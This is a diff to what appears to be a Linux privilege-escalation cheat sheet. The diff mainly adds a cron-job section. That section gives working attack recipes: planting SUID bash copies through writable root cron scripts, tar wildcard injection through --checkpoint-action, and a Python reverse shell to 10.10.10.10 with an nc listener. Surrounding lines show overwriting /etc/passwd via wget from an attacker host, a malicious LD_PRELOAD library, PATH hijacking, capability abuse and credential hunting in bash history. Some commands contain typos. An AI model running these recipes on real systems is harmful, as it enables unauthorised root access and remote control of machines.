@@ -14,6 +14,7 @@ Simple and accurate guide for linux privilege escalation tactics
 - Sudo LD_PRELOAD
 - SUID / GUID Binaries
 - SUID PATH Environmental Variable
+- Cron Tabs & Scheduled Tasks
 - Capabilities
 - NFS Root Squashing
 - Tmux
@@ -35,7 +36,6 @@ ps -aux | grep root | grep mysql
 ifconfig 
 find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \;
 locate pass | more
-
 ```
 # Bash History
 Structure : Linux Command // <Comment / Tip>
@@ -43,14 +43,12 @@ Structure : Linux Command // <Comment / Tip>
 history                            
 cat /home/<user>/.bash_history     
 cat ~/.bash_history | grep -i passw 
-
 ```
 
 # OpenVPN Credentials
 Structure : Linux Command // <Comment / Tip>
 ```
 locate *.ovpn                       
-
 ```
 
 # Writable Password Files
@@ -303,7 +301,6 @@ edit passwd
 Replace x in root's line with the copied output
 Save the file
 python -m SimpleHTTPServer 9000 // You can use any port
-
 ```
 
 Victim
@@ -312,7 +309,6 @@ Victim
 sudo wget http://<attacker_ip>:9000/passwd -O /etc/passwd
 su root // Enter the new root password you generated (Example: NewRootPassword)
 id && whoami
-
 ```
 
 
@@ -362,7 +358,6 @@ wget http://<attacker_ip>:9000/expliot.c
 Compile expliot.c: gcc expliot.c -o expliot
 ./expliot
 id && whoami 
-
 ```
 
 # Sudo LD_PRELOAD
@@ -393,7 +388,6 @@ void _init() {
 
 Compile priv.c: gcc -fPIC -shared -o priv.so priv.c -nostartfiles
 Command: sudo LD_PRELOAD=/tmp/priv.so awk // awk can be replaced with any sudo binary
-
 ```
 
 # SUID / GUID Binaries Overview
@@ -429,7 +423,6 @@ View PATH
 echo $PATH
 env | grep PATH
 print $PATH
-
 ```
 Example 1
 
@@ -473,7 +466,6 @@ echo $PATH
 export PATH=/tmp:$PATH
 /home/max/test
 id && whoami
-
 ```
 Example 2
 
@@ -500,7 +492,6 @@ echo $PATH
 export PATH=/tmp:$PATH
 /bin/tools/network-testerv1
 id && whoami
-
 ```
 
 Example 3
@@ -529,7 +520,6 @@ export PATH=/tmp:$PATH
 echo $PATH
 /bin/tools/webserver-status
 id && whoami
-
 ```
 
 Example 4
@@ -555,11 +545,144 @@ fucntion /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/b
 export -f /usr/sbin/service
 /bin/tools/webserver-status
 id && whoami
+```
+# Cron Tabs & Scheduled Tasks
+
+Cron jobs is a time-based job scheduler in Unix-like computer operating systems. Users that set up and maintain software environments use cron to schedule jobs to run periodically at fixed times, dates, or intervals
+
+Enumeration
 
 ```
-# SUID Shared Object Injection
+contab -l
+/etc/init.d
+/etc/cron*
+/etc/crontab
+/etc/cron.allow
+/etc/cron.d 
+/etc/cron.deny
+/etc/cron.daily
+/etc/cron.hourly
+/etc/cron.monthly
+/etc/cron.weekly
+```
+Example 1
 
-Privilege Escalation
+Privilege Escalation via Nonexistent File Overwrite
+
+```
+cat /etc/crontab
+Output Example: * * * * * root systemupdate.sh
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/systemupdate.sh
+chmod +x /home/user/systemupdate.sh
+Wait a while
+/tmp/bash -p
+id && whoami
+
+OR
+
+cat /etc/crontab
+Output Example: * * * * * root systemupdate.sh
+echo "#!/bin/bash" > /home/user/systemupdate.sh
+echo "chmod +s /bin/bash" >> /home/user/systemupdate.sh
+chmod +x  /home/user/systemupdate.sh
+Wait a while
+/bin/bash -p
+id && whoami
+```
+
+Example 2
+
+Privilege Escalation via Root Executable Bash Script
+
+```
+cat /etc/crontab
+Output Example: * * * * * root /usr/bin/local/network-test.sh
+echo "chmod +s /bin/bash" >> /usr/bin/local/network-test.sh
+Wait a while
+id && whomai
+```
+
+Example 3
+
+Privilege Escalation via Root Executable Python Script Overwrite
+
+Target
+
+```
+cat /etc/crontab
+Output Example: * * * * * root /var/www/html/web-backup.py
+cd /var/www/html/
+vi web-backup.py
+Add the below to the script:
+
+import socket
+import subprocess
+import os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.10.10.10",443)); 
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/bash","-i"]);'
+
+// Replace the IP & Port 
+
+// Save & Exit the Script
+```
+Attacker
+
+```
+nc -lvnp 443
+```
+
+OR
+
+Target
+
+```
+cat /etc/crontab
+Output Example: * * * * * root /var/www/html/web-backup.py
+cd /var/www/html/
+vi web-backup.py
+Add the below to the script:
+
+import os
+
+os.system("chmod +s /bin/bash")
+
+// Save & Exit the Script
+
+Wait a While
+/bin/bash -p
+id && whoami
+```
+
+Example 4
+
+Privilege Escalation via Tar Bash Script (WildCards)
+
+```
+cat /etc/crontab
+Output Example: * * * * * root /usr/bin/local/mysql-db-backup.sh
+cat /usr/bin/local/mysql-db-backup.sh
+Output of Script:
+--------------------------------
+#!/bin/bash
+
+cd /var/www/html/
+tar czf /tmp/dbbackup.tar.gz *
+--------------------------------
+cd /var /www/html/
+echo "#!/bin/bash" > priv.sh
+echo "chmod +s /bin/bash" >> priv.sh
+chmod +x priv.sh
+touch /var/www/html/--checkpoint=1
+touch /var/www/html/--checkpoint-action=exec=sh\ priv.sh
+Wait a while
+/bin/bash -p
+id && whomai
+```
 
 # Capabilities
 
@@ -589,7 +712,6 @@ getcap -r / 2>/dev/null
 /usr/bin/python3 = cap_setuid+ep
 /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 id && whoami
-
 ```
 
 Perl
@@ -599,7 +721,6 @@ getcap -r / 2>/dev/null
 /usr/bin/perl = cap_setuid+ep
 /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
 id && whoami
-
 ```
 
 Tar
@@ -623,8 +744,6 @@ Victim
 
 su root
 id && whoami
-
-
 ```
 
 # NFS Root Squashing
@@ -679,7 +798,6 @@ mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount
 cd /tmp/mount
 cp /bin/bash .
 chmod +s bash
-
 ```
 ```
 Victim
@@ -693,7 +811,6 @@ OR
 cd /tmp
 ./bash -p
 id && whoami
-
 ```
 
 # chkrootkit 0.49
@@ -711,7 +828,6 @@ echo "chmod +s /bin/bash" >> /tmp/update
 Wait a While ...
 /bin/bash -p
 id && whoami
-
 ```
 
 # Tmux
@@ -736,5 +852,4 @@ OR
 tmux list-sessions                        // Any Tmux sessions running as root?
 /tmp/tmux-14/default-root                 // Root Tmux Session
 tmux -S /opt/.dev/gbm/ attach -t 0        // Replace Path to Session (Depending on your results)
-
 ```
